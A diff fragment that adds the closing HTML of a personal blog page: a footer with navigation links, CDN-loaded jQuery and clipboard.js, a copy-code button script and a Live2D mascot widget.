+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2022
+    lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"superSample":2,"width":200,"height":350,"position":"right","hOffset":0,"vOffset":-20},"mobile":{"show":false,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
